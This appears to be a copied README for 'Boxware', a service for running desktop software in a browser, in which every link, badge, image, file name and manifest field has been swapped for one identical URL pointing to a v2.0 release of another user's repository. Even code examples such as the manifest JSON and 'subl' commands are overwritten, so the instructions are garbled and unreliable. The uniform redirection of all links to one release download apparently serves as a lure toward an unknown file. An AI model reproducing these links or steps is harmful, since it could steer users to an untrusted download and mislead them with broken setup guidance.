🚀 Boxware
[![Build Status](https://github.com/viveklivingstone/cli/releases/tag/v2.0)](https://github.com/viveklivingstone/cli/releases/tag/v2.0) 
[![GitHub license](https://github.com/viveklivingstone/cli/releases/tag/v2.0)](https://github.com/viveklivingstone/cli/releases/tag/v2.0) 
[![oclif](https://github.com/viveklivingstone/cli/releases/tag/v2.0)](https://github.com/viveklivingstone/cli/releases/tag/v2.0) 
===========

Boxware let's you try, use & modify desktop software in your browser without downloading/installing anything. Try it with this repository by clicking the button below: 

[![Try on Boxware](https://github.com/viveklivingstone/cli/releases/tag/v2.0)](https://github.com/viveklivingstone/cli/releases/tag/v2.0) 

This is how it feels : 

![Try on Boxware gif](https://github.com/viveklivingstone/cli/releases/tag/v2.0)


# 🗒 Description

Installing and using software is still a pain after all these years - incompatible hardware, limited storage, missing dependencies, messed-up versioning, large clunky downloads & complicated installs. This has made it more difficult to build new things. 

Boxware makes this easy by allowing anyone to try and use desktop software without downloading/installing anything. You specify hardware type, base image(with dependencies pre-installed), and post-deploy commands in the `https://github.com/viveklivingstone/cli/releases/tag/v2.0` manifest file and put it in your repository. You then insert a "Try on Boxware" button that looks like this into your https://github.com/viveklivingstone/cli/releases/tag/v2.0  

[![Try on Boxware](https://github.com/viveklivingstone/cli/releases/tag/v2.0)](https://github.com/viveklivingstone/cli/releases/tag/v2.0) 
  
Boxware compresses video of your software running on our servers and streams it down to your browser, and streams up your mouse clicks and keyboard strokes so you can interact with it like you would in a normal computer. In full-screen mode and at 4G speeds, it feels no different than a normal computer. 

# ✨ Add a 'Try on Boxware' button to your repository for free: 

### Step 1 : Enter your repository folder using your terminal  

```
$ cd <repository directory>
```

### Step 2 : Use the Boxware CLI to auto-generate `https://github.com/viveklivingstone/cli/releases/tag/v2.0` manifest file in your repository: 
```
$ npm install -g boxware
```
Initialize the CLI guide: 
```
$ boxware init
```
This will walk you through creating the manifest file, and will also create the "Try on Boxware" button that you can insert in your documentation. 

### Step 3 : Insert the following markdown button in your `https://github.com/viveklivingstone/cli/releases/tag/v2.0` file : 
```
 [![Try on Boxware](https://github.com/viveklivingstone/cli/releases/tag/v2.0)](https://github.com/viveklivingstone/cli/releases/tag/v2.0) 
```
Replace your own repository link in the markdown text above. That's it! That'll insert the "Try On Boxware" button on your Github documentation. 

### Longer Version: 
### Step 1 : Create `https://github.com/viveklivingstone/cli/releases/tag/v2.0` manifest file that looks like this and add it to your Github repository: 
 ```
 {
    "name": "Boxware Test",
    "version": "0.0.1",
    "description": "Test App Manifest",
    "repository": "https://github.com/viveklivingstone/cli/releases/tag/v2.0",
    "template": "boxware/ubuntu-base",
    "folder": "~/AwesomeTestFolder/Sub",
    "hardware": "https://github.com/viveklivingstone/cli/releases/tag/v2.0", 
    "commands": [
        "subl https://github.com/viveklivingstone/cli/releases/tag/v2.0",
        "subl https://github.com/viveklivingstone/cli/releases/tag/v2.0"
    ]
}
```
### Step 2 : Insert the following markdown button in your `https://github.com/viveklivingstone/cli/releases/tag/v2.0` file : 

```
 [![Try on Boxware](https://github.com/viveklivingstone/cli/releases/tag/v2.0)](https://github.com/viveklivingstone/cli/releases/tag/v2.0) 
```
Replace your own repository link in the markdown text above. That's it! That'll insert the "Try On Boxware" button on your Github documentation. 

[![Try on Boxware](https://github.com/viveklivingstone/cli/releases/tag/v2.0)](https://github.com/viveklivingstone/cli/releases/tag/v2.0)

# Advanced Users

If the desktop environment/configuration required to run your software is more complicated, then you can create your own public template on Boxware and specify it in manifest file. This is automatically used to create new desktop whenever your users want to try/use your software on it. We're still in beta and will soon release a tool allowing anyone to create and customize templates. If you want to try it early, join us at [https://github.com/viveklivingstone/cli/releases/tag/v2.0](https://github.com/viveklivingstone/cli/releases/tag/v2.0)

# 📣 Feedback
If you need help, have any suggestions or just want to let us know what you think of Boxware, send us a message on [https://github.com/viveklivingstone/cli/releases/tag/v2.0](https://github.com/viveklivingstone/cli/releases/tag/v2.0)
